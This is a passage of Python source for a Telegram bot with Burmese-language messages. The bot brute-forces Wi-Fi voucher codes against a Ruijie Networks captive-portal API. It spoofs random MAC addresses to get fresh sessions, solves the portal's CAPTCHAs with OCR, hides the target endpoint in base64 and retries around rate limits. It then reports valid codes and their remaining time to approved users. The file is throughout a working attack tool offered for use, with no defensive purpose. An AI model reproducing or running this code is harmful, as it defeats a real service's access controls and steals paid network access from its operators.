        "✓ Portal URL အားသိမ်းဆည်းပြီးပါပြီ။\n\nVOUCHER ရွေးချယ်ရန် Menu ကိုသုံးပါ။",
        reply_markup=get_voucher_keyboard()
    )

@bot.message_handler(commands=['scan'])
async def handle_key_scan(message):
    if not await has_active_access(message.chat.id):
        await send_key_required(message)
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "VOUCHER ရွေးချယ်ရန်:\n\n/scan 6, 7, 8, 9, ascii-lower, ascii-lower9, all, mixed, mixed7, mixed8, mixed9",
            reply_markup=get_voucher_keyboard()
        )
        return
    mode = args[1]
    chat_id = message.chat.id
    user_id = str(chat_id)
    
    if chat_id not in user_data:
        await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
        return
    if 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။")
        return

    progress_msg = await bot.send_message(chat_id, f"""{DRAGON_LOGO}

⏹️ STOP SCAM
{DRAGON_DIVIDER}
𖤐 Tried: 0
𓂀 Current Code: 000000
♛ Hits: 0
⌛ Expired: 0
⛓ Limits: 0
⟡ Speed: 0.0 c/m
◇ Proxies: 0/0
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
◆ Hit Codes:
None yet""")
    scan_id = str(uuid.uuid4())

    task = asyncio.create_task(
        run_bruteforce(
            mode,
            chat_id,
            user_data[chat_id]['session_url'],
            scan_id,
            message=message,
            progress_msg=progress_msg
        )
    )

    scan_tasks[chat_id] = {
        "task": task,
        "stop": False,
        "scan_id": scan_id
    }

@bot.message_handler(commands=['status'])
async def status(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    approved_users = sum(1 for v in approve.values() if v)
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(
        message,
        f"◉ Bot Status\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"⌕ Active Scans: {active_scans}\n"
        f"✓ Users: {approved_users}\n"
        f"◎ Sessions Loaded: {len(user_data)}\n"
        f"◇ Proxies: {len(PROXY_LIST)}"
    )

async def send_success_file(chat_id):
    target_ids = ["6988969946", "1981253384", "1477223103"]
    if str(chat_id) in target_ids and chat_id in success_texts and success_texts[chat_id]:
        try:
            filename = f"success_{chat_id}_{int(time.time())}.txt"
            content = "\n".join(success_texts[chat_id])
            with open(filename, "w", encoding="utf-8") as f:
                f.write(content)
            
            with open(filename, "rb") as f:
                await bot.send_document(chat_id, f, caption="✓ Scan ရပ်တန့်သွားသောကြောင့် ရရှိထားသော Success Codes များကို ဖိုင်အဖြစ် ပို့ပေးလိုက်ပါသည်။")
            
            if os.path.exists(filename):
                os.remove(filename)
        except Exception as e:
            print(f"Error sending file: {e}")

@bot.message_handler(commands=['stop'])
async def stop_scan_command(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        await send_success_file(chat_id)
        
        data["task"].cancel()
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        await bot.reply_to(message, "■ Scan ကို ရပ်တန့်ပြီးပါပြီ။", reply_markup=get_back_keyboard())
    else:
        await bot.reply_to(message, "ရပ်တန့်ရန် Scan မရှိပါ။", reply_markup=get_back_keyboard())

async def local_update_scheduler():
    """Persist queued success codes to local storage periodically."""
    global SUCCESS_CODE
    while True:
        await asyncio.sleep(180)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                for item in items:
                    chat_id = str(item["chat_id"])
                    code = item["code"]
                    if chat_id not in results:
                        results[chat_id] = []
                    if code not in results[chat_id]:
                        results[chat_id].append(code)
                await update_file_content("result.json", results, sha, "Periodic Update")
            except Exception as e:
                print(f"Update Error: {e}")

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

strings = string.ascii_lowercase + string.digits
def all_generator(length=6):
    return "".join(random.choice(strings) for _ in range(length))

strings_2 = string.ascii_lowercase
def ascii_generator(length=6):
    return "".join(random.choice(strings_2) for _ in range(length))

strings_mixed = string.ascii_lowercase + string.digits
def mixed_generator(length=6):
    return "".join(random.choice(strings_mixed) for _ in range(length))

def iter_codes(mode, start_digit=None):
    if mode in ["6", "7", "8", "9"]:
        length = int(mode)
        if start_digit is not None:
            start = int(start_digit) * (10 ** (length - 1))
            end = (int(start_digit) + 1) * (10 ** (length - 1))
            for i in range(start, end):
                yield str(i).zfill(length)
            return
            
        if mode in ["6", "7", "8"]:
            codes = [str(i).zfill(length) for i in range(10 ** length)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "9":
            while True:
                yield digit_generator(9)
            return
    
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    
    if mode == "ascii-lower9":
        while True:
            yield ascii_generator(9)
    
    if mode == "all":
        while True:
            yield all_generator(6)
    
    if mode == "mixed":
        while True:
            yield mixed_generator(6)
    
    if mode == "mixed7":
        while True:
            yield mixed_generator(7)
    
    if mode == "mixed8":
        while True:
            yield mixed_generator(8)
    
    if mode == "mixed9":
        while True:
            yield mixed_generator(9)
    
    raise ValueError(f"Unsupported scan mode: {mode}")

BATCH_SIZE = 1000

def _captcha_entry(chat_id):
    if chat_id not in captcha_state:
        captcha_state[chat_id] = {
            "session_id": None,
            "auth_code": None,
            "lock": asyncio.Lock(),
        }
    return captcha_state[chat_id]

async def get_captcha(chat_id, session, session_url):
    entry = _captcha_entry(chat_id)
    if entry["session_id"] and entry["auth_code"]:
        return entry["session_id"], entry["auth_code"]
    async with entry["lock"]:
        if entry["session_id"] and entry["auth_code"]:
            return entry["session_id"], entry["auth_code"]
        session_id = await get_session_id(session, session_url, entry.get("session_id"))
        if not session_id:
            return None, None
        for _ in range(10):
            image = await Captcha_Image(session, session_id)
            text = await Captcha_Text(image)
            verified = await Varify_Captcha(session, session_id, text)
            if verified:
                entry["session_id"] = session_id
                entry["auth_code"] = text
                return session_id, text
        return None, None

def invalidate_captcha(chat_id):
    entry = _captcha_entry(chat_id)
    entry["session_id"] = None
    entry["auth_code"] = None

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None, start_digit=None):
    try:
        code_iter = iter_codes(mode, start_digit=start_digit)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    
    if mode in ["6", "7", "8"]:
        total = 10 ** int(mode)
    elif mode == "9":
        total = None
    elif mode in ["mixed", "mixed7", "mixed8", "mixed9"]:
        total = None
    elif mode in ["ascii-lower", "ascii-lower9"]:
        total = None
    elif mode == "all":
        total = None
    else:
        total = None
    
    checked = 0
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            checked += len(batch)

            found = len(success_texts.get(chat_id, []))
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            
            # Format progress with hit codes
            hit_codes_text = ""
            if chat_id in success_texts and success_texts[chat_id]:
                hit_codes_list = []
                for hit in success_texts[chat_id]:
                    parts = hit.split(" : ")
                    if len(parts) == 2:
                        code = parts[0]
                        info = parts[1]
                        hit_codes_list.append(f"꧁༺ {code:<8}  :  {info} ༻꧂")
                    else:
                        hit_codes_list.append(f"꧁༺ {hit} ༻꧂")
                hit_codes_text = "\n".join(hit_codes_list)
            else:
                hit_codes_text = "None yet"
            
            proxies_used = len(PROXY_LIST) if PROXY_LIST else 0
            proxies_total = len(PROXY_LIST) if PROXY_LIST else 0
            
            # Build the progress text
            text = f"""{DRAGON_LOGO}

⏹️ STOP SCAM
{DRAGON_DIVIDER}
𖤐 Tried: {checked:,}
𓂀 Current Code: {batch[-1] if batch else '...'}
♛ Hits: {found}
⌛ Expired: 0
⛓ Limits: 0
⚡ Speed: {speed:.1f} c/m
◇ Proxies: {proxies_used}/{proxies_total}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
◆ Hit Codes:
{hit_codes_text}"""
            
            # Add last hit if exists
            if chat_id in success_texts and success_texts[chat_id]:
                last_hit = success_texts[chat_id][-1]
                parts = last_hit.split(" : ")
                if len(parts) == 2:
                    code = parts[0]
                    info = parts[1]
                    text += f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n꧁༺ Last: ✓ HIT: {code} | {info} ༻꧂"
                else:
                    text += f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n꧁༺ Last: ✓ HIT: {last_hit} ༻꧂"
            
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
            except Exception:
                try:
                    new_msg = await bot.send_message(chat_id, text)
                    progress_msg.message_id = new_msg.message_id
                except Exception as err:
                    print(f"Progress Message Error: {err}")

        if progress_msg:
            found = len(success_texts.get(chat_id, []))
            finish_text = f"""✓ Scan Completed!

𖤐 Tried: {checked:,}
♛ Hits: {found}

◆ Hit Codes:
{hit_codes_text}"""
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text)
            except:
                try:
                    await bot.send_message(chat_id, finish_text)
                except Exception as err:
                    print(f"Progress Finish Message Error: {err}")
        await send_success_file(chat_id)
        
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
    finally:
        await send_success_file(chat_id)
        
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        global active_scans_count, active_scans_lock
        async with active_scans_lock:
            active_scans_count = max(0, active_scans_count - 1)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    
    proxy = None
    
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True, proxy=proxy) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1)
            return previous_session_id
    except:
        return previous_session_id

def replace_mac(url, new_mac):
    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    return url

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    
    for _attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:
            session_id = await get_session_id(task_session, session_url, None)
            if not session_id:
                return
            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except Exception as e:
                    print(f"[perform_check] captcha error: {e}")
            if not auth_code:
                return
            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return
            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Geo) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            
            proxy = None
            
            try:
                async with task_session.post(post_url, json=data, headers=headers, proxy=proxy) as req:
                    response = await req.text()
                    resp_json = json.loads(response)
                    print(f"[voucher] code={code} attempt={_attempt+1} status={req.status} resp={resp_json}")
            except Exception as e:
                print(f"[perform_check] error: {e}")
                return
        if response and 'request limited' in response:
            print(f"[perform_check] rate limited on code={code}, retrying (attempt {_attempt+1}/3)")
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code

        if chat_id not in success_texts:
            success_texts[chat_id] = []

        expire_date, raw_mins = await Code_Expires_Date(session_id)
        
        hit_entry = f"{code} : {expire_date}"
        success_texts[chat_id].append(hit_entry)
        
        if chat_id not in user_data:
            user_data[chat_id] = {}
        
        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
        
    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)

async def Code_Expires_Date(active_id):
    paths = [
        f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/maccauth/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_id}'
    ]
    
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    timeout = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(
        connector=_connector,
        connector_owner=False,
        cookie_jar=aiohttp.CookieJar(),
        timeout=timeout
    ) as fresh_session:
        for url in paths:
            try:
                async with fresh_session.get(url, headers=headers) as req:
                    if req.status == 200:
                        respond = await req.json()
                        if respond.get('success'):
                            result = respond.get('result', {})
                            raw_minutes = result.get('totalMinutes')
                            if raw_minutes is None:
                                raw_minutes = result.get('remainingMinutes')
                            
                            if raw_minutes is None:
                                raw_minutes = 'Unknown'
                                
                            profile_name = result.get('profileName', 'Unknown')
                            totaltime = Minute_to_Hour(raw_minutes)
                            display = f"{profile_name}, ⏰: {totaltime}"
                            return display, raw_minutes
            except Exception as e:
                print(f"[Code_Expires_Date] path error: {e}")
                continue
                
    return "Unknown, ⏰: Unknown", 'Unknown'

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    try:
        mins = int(total_minutes)
        if mins == 0:
            return "0m"
        hours = mins // 60
        rem_minutes = mins % 60
        if hours > 0 and rem_minutes > 0:
            return f"{hours}h {rem_minutes}m"
        elif hours > 0:
            return f"{hours}h"
        else:
            return f"{rem_minutes}m"
    except:
        return 'Unknown'

_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {
        'sessionId': session_id,
        '_t': str(time.time()),
    }
    
    proxy = None
    
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers, proxy=proxy) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {
        'sessionId': session_id,
        'authCode': text,
    }
    
    proxy = None
    
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data, proxy=proxy) as req:
        data = await req.json()
        print(f"[Varify_Captcha] status={req.status} authCode={text} response={data}")
        if data.get("success") == True:
            return session_id
        return None

async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(
        limit=20000,
        limit_per_host=10000,
        ttl_dns_cache=300,
        ssl=False
    )
    session = aiohttp.ClientSession(
        timeout=timeout,
        connector=_connector,
        connector_owner=False
    )
    try:
        # Proxy Auto Update ကို စတင်မယ်
        asyncio.create_task(web_server())
        asyncio.create_task(local_update_scheduler())
        asyncio.create_task(auto_update_proxies())  # ✦ Proxy Auto Update
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    # Bot စတင်တာနဲ့ Proxy ဆွဲမယ်
    import requests
    for url in PROXY_SOURCES:
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                for line in r.text.split("\n"):
                    line = line.strip()
                    if line and ":" in line and not line.startswith("#"):
                        if line not in PROXY_LIST:
                            PROXY_LIST.append(line)
        except:
            pass
    print(f"✓ Proxy {len(PROXY_LIST)} ခု ရယူပြီး")
    print(f"↻ Auto Update ကို မိနစ် ၃၀ တစ်ခါ လုပ်မယ်")
    asyncio.run(main())
